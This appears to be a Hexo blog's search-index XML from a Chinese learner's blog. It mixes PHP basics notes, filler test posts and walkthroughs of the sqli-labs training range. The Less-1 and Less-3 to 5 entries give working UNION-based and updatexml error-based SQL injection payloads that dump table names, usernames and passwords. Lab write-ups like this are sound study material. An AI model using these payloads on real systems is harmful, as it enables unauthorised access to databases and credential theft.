<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于</title>
      <link href="/%E4%B8%80%E4%BA%9B%E6%96%B0%E7%9F%A5.html"/>
      <url>/%E4%B8%80%E4%BA%9B%E6%96%B0%E7%9F%A5.html</url>
      
        <content type="html"><![CDATA[<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>其含义可以理解为数据包中的”有效数据”。也可以指真正在目标系统执行的代码或指令，黑客所谓的payload指的是病毒或者木马执行的一些有害的恶性动作</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p><a href="https://blog.csdn.net/m0_51545690/article/details/123359959?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168014522916800211579670%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168014522916800211579670&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123359959-null-null.142%5Ev77%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=cookis%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_51545690/article/details/123359959?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168014522916800211579670%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168014522916800211579670&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123359959-null-null.142^v77^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=cookis%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8&amp;spm=1018.2226.3001.4187</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-3-6</title>
      <link href="/sqli-lab-Less-3.html"/>
      <url>/sqli-lab-Less-3.html</url>
      
        <content type="html"><![CDATA[<p>第二关和第一关类似，就不在过多赘述</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>第三关我们先查看一下源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>这样一行代码，即我们输入的值被(‘’)包括，类似的，将其闭合<br>Less-3&#x2F;?id&#x3D;1’)<br>后面都与第一关相同</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>“两边的单引号是引双引号的，即id是用双引号和括号闭合的</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>首先依然是判断注入点类型，’闭合</p><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p>通过分析上面的代码得知，数据库会报错</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>于是我们可以尝试使用updatexml报错注入，因为有时候报错注入的致命错误会显示出来，数据库只忽略普通报错</p><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) --+</code><br><img src="/img/23.png"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;),1) --+</code><br><img src="/img/24.png"></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39; limit 1,1),&#39;~&#39;),1) --+</code><br><img src="/img/25.png"><br>limlt 2，1<br><img src="/img/26.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select username,password from users limit 0,1),&#39;~&#39;),1) --+</code><br><img src="/img/27.png"><br>一个字段一个字段来<br><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(password) from users ),&#39;~&#39;),1) --+</code><br><img src="/img/28.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-1</title>
      <link href="/%E4%BD%BF%E7%94%A8php%E6%93%8D%E4%BD%9Cmysql.html"/>
      <url>/%E4%BD%BF%E7%94%A8php%E6%93%8D%E4%BD%9Cmysql.html</url>
      
        <content type="html"><![CDATA[<h2 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h2><p>加入单引号查看是存在注入Less-1&#x2F;?id&#x3D;1’<br><img src="/img/11.png"><br>发现报语法错误，说明’被带入数据库中查询，并未被过滤，原因是无论字符型还是整型都会因为单引号个数不匹配而报错，说明大概率存在sql注入漏洞</p><h2 id="判断注入点类型（字符型或数字型）"><a href="#判断注入点类型（字符型或数字型）" class="headerlink" title="判断注入点类型（字符型或数字型）"></a>判断注入点类型（字符型或数字型）</h2><p>Less-1&#x2F;?id&#x3D;1’and ‘1’&#x3D;’1<br><img src="/img/12.png"><br>Less-1&#x2F;?id&#x3D;1’and ‘1’&#x3D;’2<br><img src="/img/13.png"><br>则推断出为字符型注入点</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p>知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数<br>?id&#x3D;1’order by 3 –+<br>order by 4 报错<br><img src="/img/14.png"></p><h2 id="判断显错位"><a href="#判断显错位" class="headerlink" title="判断显错位"></a>判断显错位</h2><p>判断其第几列有回显，这里注意id后面的数字要采用一个不存在的数字，比如-1<br><code>Less-1/?id=-1&#39; union select 1,2,3 --+</code><br><img src="/img/15.png"><br>2和3都是显错位</p><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>Less-1/?id=-1&#39; union select 1,database(),3 --+</code><br><img src="/img/16.png"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>Less-1/?id=-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 3,1 --+</code><br><img src="/img/17.png"><br><code>Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="/img/18.png"><br>第二种虽然方便，但显示位不够时可能出现问题</p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;user&#39; --+</code><br>同样也可以使用limit一个一个显示<br><img src="/img/19.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code>Less-1/?id=-1&#39; union select 1,username,password from users --+</code><br><img src="/img/20.png"><br><code>Less-1/?id=-1&#39; union select 1,username,password from users limit 1,1 --+</code><br><img src="/img/21.png"><br>同样也可一次性显示<br><code>Less-1/?id=-1&#39; union select 1,2,group_concat(id,username,password) from users limit 1,1 --+</code><br><img src="/img/22.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php表单</title>
      <link href="/php%E8%A1%A8%E5%8D%95.html"/>
      <url>/php%E8%A1%A8%E5%8D%95.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h2><h3 id="feof函数"><a href="#feof函数" class="headerlink" title="feof函数"></a>feof函数</h3><p>feof函数的返回值是一个整型数,如果文件没有到达末尾,则返回值为0;如果文件到达末尾,则返回值为1</p><p><img src="/img/10.png"></p><h3 id="PHP-文件上传"><a href="#PHP-文件上传" class="headerlink" title="PHP 文件上传"></a>PHP 文件上传</h3><p>通过 PHP，可以把文件上传到服务器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs</title>
      <link href="/sqlilabs.html"/>
      <url>/sqlilabs.html</url>
      
        <content type="html"><![CDATA[<h2 id="sqlilabs靶场介绍"><a href="#sqlilabs靶场介绍" class="headerlink" title="sqlilabs靶场介绍"></a>sqlilabs靶场介绍</h2><p>SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，<br>用来学习sql注入的一个游戏教程。<br>原文链接：<a href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">https://blog.csdn.net/Joker_Dgh/article/details/123913722</a></p><h2 id="进入靶场"><a href="#进入靶场" class="headerlink" title="进入靶场"></a>进入靶场</h2><p><img src="/img/9.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习2</title>
      <link href="/php%E5%AD%A6%E4%B9%A02.html"/>
      <url>/php%E5%AD%A6%E4%B9%A02.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-数组"><a href="#PHP-数组" class="headerlink" title="PHP 数组"></a>PHP 数组</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I like &quot;</span> . <span class="variable">$cars</span>[<span class="number">0</span>] . <span class="string">&quot;, &quot;</span> . <span class="variable">$cars</span>[<span class="number">1</span>] . <span class="string">&quot; and &quot;</span> . <span class="variable">$cars</span>[<span class="number">2</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在 PHP 中，array() 函数用于创建数组</p><h3 id="获取数组的长度-count-函数"><a href="#获取数组的长度-count-函数" class="headerlink" title="获取数组的长度 - count() 函数"></a>获取数组的长度 - count() 函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="variable">$arrlength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-关联数组"><a href="#PHP-关联数组" class="headerlink" title="PHP 关联数组"></a>PHP 关联数组</h3><p>这里有两种创建关联数组的方法：<br>$age&#x3D;array(“Peter”&#x3D;&gt;”35”,”Ben”&#x3D;&gt;”37”,”Joe”&#x3D;&gt;”43”);<br>or:<br>$age[‘Peter’]&#x3D;”35”;<br>$age[‘Ben’]&#x3D;”37”;<br>$age[‘Joe’]&#x3D;”43”;</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Peter is &quot;</span> . <span class="variable">$age</span>[<span class="string">&#x27;Peter&#x27;</span>] . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-数组排序"><a href="#PHP-数组排序" class="headerlink" title="PHP 数组排序"></a>PHP 数组排序</h3><p>sort() - 对数组进行升序排列<br>rsort() - 对数组进行降序排列<br>asort() - 根据关联数组的值，对数组进行升序排列<br>ksort() - 根据关联数组的键，对数组进行升序排列<br>arsort() - 根据关联数组的值，对数组进行降序排列<br>krsort() - 根据关联数组的键，对数组进行降序排列<br>$arr &#x3D; (‘a’&#x3D;&gt;’apple’,’b’&#x3D;&gt;’banana’);其中，a、b 是这个数组的键值，apple、banana 是值。<br>php 数组的键值可以是字符串，可以是数字，也可以从任何一个数字开始作为数组的键值开端。<br>$arr &#x3D; array(0,1,2);像这个数组，键值没有出现，那么键值就是默认的从 0 开始，等同于 $arr &#x3D; array(0&#x3D;&gt;0,1&#x3D;&gt;1,2&#x3D;&gt;2)</p><h3 id="PHP-超级全局变量"><a href="#PHP-超级全局变量" class="headerlink" title="PHP 超级全局变量"></a>PHP 超级全局变量</h3><p>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。<br>以下列举出几个常用超级全局变量：</p><h3 id="PHP-GLOBALS"><a href="#PHP-GLOBALS" class="headerlink" title="PHP $GLOBALS"></a>PHP $GLOBALS</h3><p>$GLOBALS 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。<br>$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><h2 id="PHP-循环"><a href="#PHP-循环" class="headerlink" title="PHP 循环"></a>PHP 循环</h2><p>while - 只要指定的条件成立，则循环执行代码块<br>do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环<br>for - 循环执行代码块指定的次数<br>foreach - 根据数组中每个元素来循环代码块</p><h3 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  为 &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;，对应的 value 为 &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</p><h2 id="PHP-函数"><a href="#PHP-函数" class="headerlink" title="PHP 函数"></a>PHP 函数</h2><p>由于之前c语言学过，故容易理解</p><h2 id="PHP-魔术常量"><a href="#PHP-魔术常量" class="headerlink" title="PHP 魔术常量"></a>PHP 魔术常量</h2><p>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。<br>例如 <strong>LINE</strong> 的值就依赖于它在脚本中所处的行来决定。这些特殊的常量不区分大小写</p><h3 id="LINE"><a href="#LINE" class="headerlink" title="LINE"></a><strong>LINE</strong></h3><p>文件中的当前行号</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;这是第 &quot; &#x27;</span>  . <span class="keyword">__LINE__</span> . <span class="string">&#x27; &quot; 行&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a><strong>FILE</strong></h3><p>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;该文件位于 &quot; &#x27;</span>  . <span class="keyword">__FILE__</span> . <span class="string">&#x27; &quot; &#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上实例输出结果为：<br>该文件位于 “ E:\wamp\www\test\index.php ”</p><h3 id="DIR"><a href="#DIR" class="headerlink" title="DIR"></a><strong>DIR</strong></h3><p>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录</p><h3 id="FUNCTION"><a href="#FUNCTION" class="headerlink" title="FUNCTION"></a><strong>FUNCTION</strong></h3><p>返回该函数被定义时的名字（区分大小写）</p><h3 id="CLASS"><a href="#CLASS" class="headerlink" title="CLASS"></a><strong>CLASS</strong></h3><p>常量返回该类被定义时的名字（区分大小写）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_print</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;类名为：&#x27;</span>  . <span class="keyword">__CLASS__</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&#x27;函数名为：&#x27;</span> . <span class="keyword">__FUNCTION__</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">_print</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上实例输出结果为：<br>类名为：test<br>函数名：_print</p><h2 id="PHP-命名空间"><a href="#PHP-命名空间" class="headerlink" title="PHP 命名空间"></a>PHP 命名空间</h2><p>PHP 命名空间(namespace)是在 PHP 5.3 中加入的，目的是解决重名问题，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。</p><p>PHP 命名空间可以解决以下两类问题：<br>1、用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。<br>2、为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</p><p>命名空间通过关键字namespace 来声明。如果一个文件中包含命名空间，它必须在其它所有代码之前声明命名空间。语法格式如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyProject</span> &#123;</span><br><span class="line">    <span class="title class_">const</span> <span class="title class_">CONNECT_OK</span> = 1;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* ... */</span>  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">AnotherProject</span> &#123;</span><br><span class="line">    <span class="title class_">const</span> <span class="title class_">CONNECT_OK</span> = 1;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* ... */</span>  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyProject</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">const</span> <span class="title class_">CONNECT_OK</span> = 1;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* ... */</span>  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123; // 全局代码</span><br><span class="line"><span class="title class_">session_start</span>();</span><br><span class="line"><span class="variable">$a</span> = MyProject\<span class="title function_ invoke__">connect</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">MyProject\Connection</span>::<span class="title function_ invoke__">start</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p><h3 id="子命名空间"><a href="#子命名空间" class="headerlink" title="子命名空间"></a>子命名空间</h3><p>与目录和文件的关系很像，PHP 命名空间也允许指定层次化的命名空间的名称</p><h2 id="PHP-类定义"><a href="#PHP-类定义" class="headerlink" title="PHP 类定义"></a>PHP 类定义</h2><p>PHP_EOL 为换行符。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpClass</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var2</span> = <span class="string">&quot;constant string&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> (<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">     [..]</span><br><span class="line">  &#125;</span><br><span class="line">  [..]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>类使用 class 关键字后加上类名定义。<br>类名后的一对大括号({})内可以定义变量和方法。<br>类的变量使用 var 来声明, 变量也可以初始化值。<br>函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习1</title>
      <link href="/php%E5%AD%A6%E4%B9%A01.html"/>
      <url>/php%E5%AD%A6%E4%B9%A01.html</url>
      
        <content type="html"><![CDATA[<h2 id="php语法"><a href="#php语法" class="headerlink" title="php语法"></a>php语法</h2><p>设置常量，使用 define() 函数，函数语法如下：<br>bool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )<br>常量定义后默认是全局，即使定义在函数外也可在函数内部使用<br>Php并置运算符：（.)用于将两个字符串连接在一起，<br>Strpos（）函数用于查找字符串中的一个字符或一段指定文本，若找到则返回匹配的首字符位置，若找不到则返回false（字符串的首字符位置为0）<br><img src="/img/php1.png"></p><p>若第一次取反后是正数则直接计算取反后的十进制数即可<br>var_dump()———&gt;&gt;输出展示展示代码内容，结构与类型<br>a.&#x3D;b等同于a&#x3D;a.b，即两个字符串相连的结果<br>(expr1) ? (expr2) : (expr3)<br>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3<br>PHP_EOL 是一个换行符<br>$c &#x3D; $a &lt;&#x3D;&gt; $b：如果 $a &gt; $b, 则 $c 的值为 1；如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0；如果 $a &lt; $b, 则 $c 的值为 -1</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yh w</title>
      <link href="/yh-w.html"/>
      <url>/yh-w.html</url>
      
        <content type="html"><![CDATA[<h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><p>啊啊啊啊啊啊啊啊啊啊<br>啊啊啊啊啊啊啊啊啊啊</p><h3 id="66"><a href="#66" class="headerlink" title="66"></a>66</h3><p>啊啊啊啊啊啊啊啊啊啊<br>啊啊啊啊啊啊啊啊啊啊</p><h2 id="666-1"><a href="#666-1" class="headerlink" title="666"></a>666</h2><p>hhhhhhhhhhhhhhhhhhh<br>hhhh<br>hhhhhhhh</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>yhw</title>
      <link href="/yhw.html"/>
      <url>/yhw.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span> () &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world.html"/>
      <url>/hello-world.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 